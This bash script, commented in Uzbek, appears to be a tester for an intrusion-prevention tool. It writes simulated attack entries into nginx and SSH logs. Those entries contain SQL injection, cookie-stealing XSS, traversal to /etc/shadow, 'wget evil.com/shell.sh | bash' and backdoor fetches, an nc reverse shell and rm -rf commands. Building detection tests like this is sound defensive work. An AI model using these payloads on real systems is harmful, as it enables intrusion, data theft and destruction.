#!/bin/bash
# ============================================================
#  DSIPS — Test Attack Logs
#  Barcha hujum turlarini nginx access.log ga yozadi
#  Ishlatish: sudo bash attack.sh
# ============================================================

LOG="/var/log/nginx/access.log"
DATE=$(date '+%d/%b/%Y:%H:%M:%S +0000')

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

ok()   { echo -e "  ${GREEN}✓${NC}  $1"; }
info() { echo -e "  ${CYAN}→${NC}  $1"; }
warn() { echo -e "  ${YELLOW}!${NC}  $1"; }

log_entry() {
    local ip="$1"
    local method="$2"
    local path="$3"
    local status="$4"
    local ua="$5"
    echo "${ip} - - [${DATE}] \"${method} ${path} HTTP/1.1\" ${status} 512 \"-\" \"${ua}\"" >> "$LOG"
}

echo ""
echo -e "${BOLD}${RED}  DSIPS Attack Test${NC}"
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

[[ $EUID -ne 0 ]] && warn "Root huquqi tavsiya etiladi (log yozish uchun)" && echo ""

# ── 1. SQL Injection ──────────────────────────────────────────
info "SQL Injection yozilmoqda..."
log_entry "185.220.101.10" "GET" "/login?id=1'+UNION+SELECT+username,password+FROM+users--" "200" "Mozilla/5.0"
sleep 0.2
log_entry "185.220.101.10" "GET" "/search?q=1'+OR+'1'='1" "200" "Mozilla/5.0"
sleep 0.2
log_entry "185.220.101.10" "POST" "/api/user?id=1;+DROP+TABLE+users--" "200" "Mozilla/5.0"
sleep 0.2
log_entry "185.220.101.10" "GET" "/page?id=1+AND+SLEEP(5)" "200" "Mozilla/5.0"
sleep 0.2
log_entry "185.220.101.10" "GET" "/index?cat=1+AND+1=1+UNION+SELECT+load_file('/etc/passwd')" "200" "Mozilla/5.0"
ok "SQL Injection — 5 ta log yozildi  (IP: 185.220.101.10)"
sleep 1

# ── 2. XSS ───────────────────────────────────────────────────
info "XSS yozilmoqda..."
log_entry "45.33.32.156" "GET" "/search?q=<script>alert(document.cookie)</script>" "200" "Mozilla/5.0"
sleep 0.2
log_entry "45.33.32.156" "GET" "/comment?text=<iframe+src=javascript:alert(1)>" "200" "Mozilla/5.0"
sleep 0.2
log_entry "45.33.32.156" "POST" "/profile?bio=<img+onerror=eval(atob('base64code'))+src=x>" "200" "Mozilla/5.0"
ok "XSS — 3 ta log yozildi  (IP: 45.33.32.156)"
sleep 1

# ── 3. Directory Traversal ────────────────────────────────────
info "Directory Traversal yozilmoqda..."
log_entry "91.108.4.20" "GET" "/download?file=../../etc/passwd" "200" "Mozilla/5.0"
sleep 0.2
log_entry "91.108.4.20" "GET" "/../../../etc/shadow" "403" "Mozilla/5.0"
sleep 0.2
log_entry "91.108.4.20" "GET" "/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd" "200" "Mozilla/5.0"
sleep 0.2
log_entry "91.108.4.20" "GET" "/file?path=....//....//etc/passwd" "200" "Mozilla/5.0"
ok "Directory Traversal — 4 ta log yozildi  (IP: 91.108.4.20)"
sleep 1

# ── 4. RCE ───────────────────────────────────────────────────
info "Remote Code Execution yozilmoqda..."
log_entry "194.165.16.10" "GET" "/cmd?exec=;+ls+-la+/etc/" "200" "Mozilla/5.0"
sleep 0.2
log_entry "194.165.16.10" "POST" "/api/run?cmd=|+cat+/etc/passwd" "200" "Mozilla/5.0"
sleep 0.2
log_entry "194.165.16.10" "GET" "/shell?c=\$(wget+http://evil.com/shell.sh+-O-+|+bash)" "200" "Mozilla/5.0"
sleep 0.2
log_entry "194.165.16.10" "POST" "/upload?exec=system('id')" "200" "Mozilla/5.0"
ok "RCE — 4 ta log yozildi  (IP: 194.165.16.10)"
sleep 1

# ── 5. LFI ───────────────────────────────────────────────────
info "Local File Inclusion yozilmoqda..."
log_entry "77.88.21.50" "GET" "/page?include=php://filter/convert.base64-encode/resource=/etc/passwd" "200" "Mozilla/5.0"
sleep 0.2
log_entry "77.88.21.50" "GET" "/index?page=php://input" "200" "Mozilla/5.0"
sleep 0.2
log_entry "77.88.21.50" "GET" "/view?file=phar://uploads/shell.phar/shell" "200" "Mozilla/5.0"
ok "LFI — 3 ta log yozildi  (IP: 77.88.21.50)"
sleep 1

# ── 6. Command Injection ──────────────────────────────────────
info "Command Injection yozilmoqda..."
log_entry "103.21.244.10" "GET" "/ping?host=8.8.8.8;+rm+-rf+/var/www" "200" "Mozilla/5.0"
sleep 0.2
log_entry "103.21.244.10" "POST" "/api?cmd=test&&+wget+http://evil.com/backdoor" "200" "Mozilla/5.0"
sleep 0.2
log_entry "103.21.244.10" "GET" "/tool?ip=127.0.0.1;+mkfifo+/tmp/f;nc+-e+/bin/sh" "200" "Mozilla/5.0"
ok "Command Injection — 3 ta log yozildi  (IP: 103.21.244.10)"
sleep 1

# ── 7. Scanner / Recon ───────────────────────────────────────
info "Scanner/Recon yozilmoqda..."
log_entry "162.158.88.10" "GET" "/admin" "404" "sqlmap/1.7.8#stable (https://sqlmap.org)"
sleep 0.2
log_entry "162.158.88.10" "GET" "/wp-admin" "404" "Nikto/2.1.6"
sleep 0.2
log_entry "162.158.88.10" "GET" "/.env" "404" "gobuster/3.6"
sleep 0.2
log_entry "162.158.88.10" "GET" "/config.php" "404" "nuclei/3.1.0"
sleep 0.2
log_entry "162.158.88.10" "GET" "/.git/config" "404" "dirbuster/1.0"
ok "Scanner/Recon — 5 ta log yozildi  (IP: 162.158.88.10)"
sleep 1

# ── 8. HTTP Brute Force (401) ─────────────────────────────────
info "HTTP Brute Force yozilmoqda (15 ta 401)..."
for i in $(seq 1 15); do
    log_entry "5.188.206.10" "POST" "/admin/login" "401" "Mozilla/5.0 BruteForcer"
    sleep 0.1
done
ok "HTTP Brute Force — 15 ta 401 log yozildi  (IP: 5.188.206.10)"
sleep 1

# ── 9. DDoS — ko'p so'rovlar ─────────────────────────────────
info "DDoS simulatsiya qilinmoqda (150 so'rov tez ketma-ket)..."
for i in $(seq 1 150); do
    log_entry "198.199.10.50" "GET" "/" "200" "Mozilla/5.0 DDoSBot/1.0"
done
ok "DDoS — 150 ta so'rov yozildi  (IP: 198.199.10.50)"
sleep 1

# ── 10. SSH Brute Force — auth.log ───────────────────────────
info "SSH Brute Force yozilmoqda (auth.log)..."
AUTH_LOG="/var/log/auth.log"
if [ -f "$AUTH_LOG" ]; then
    for i in $(seq 1 5); do
        echo "$(date '+%b %d %H:%M:%S') $(hostname) sshd[12345]: Failed password for root from 203.0.113.50 port 4444$i ssh2" >> "$AUTH_LOG"
        sleep 0.1
        echo "$(date '+%b %d %H:%M:%S') $(hostname) sshd[12345]: Invalid user admin from 203.0.113.50 port 5555$i" >> "$AUTH_LOG"
        sleep 0.1
    done
    ok "SSH Brute Force — 10 ta log yozildi  (IP: 203.0.113.50)"
else
    warn "auth.log topilmadi — o'tkazib yuborildi"
fi

echo ""
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${GREEN}${BOLD}✓  Barcha test loglari yozildi!${NC}"
echo ""
echo -e "  ${BOLD}Test IP lari:${NC}"
echo -e "  185.220.101.10  → SQL Injection"
echo -e "  45.33.32.156    → XSS"
echo -e "  91.108.4.20     → Directory Traversal"
echo -e "  194.165.16.10   → RCE"
echo -e "  77.88.21.50     → LFI"
echo -e "  103.21.244.10   → Command Injection"
echo -e "  162.158.88.10   → Scanner/Recon"
echo -e "  5.188.206.10    → HTTP Brute Force"
echo -e "  198.199.10.50   → DDoS"
echo -e "  203.0.113.50    → SSH Brute Force"
echo ""
echo -e "  ${CYAN}DSIPS loglari:${NC}  journalctl -u dsips -f"
echo -e "  ${CYAN}Bloklangan:${NC}     ipset list dsips_blocked"
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""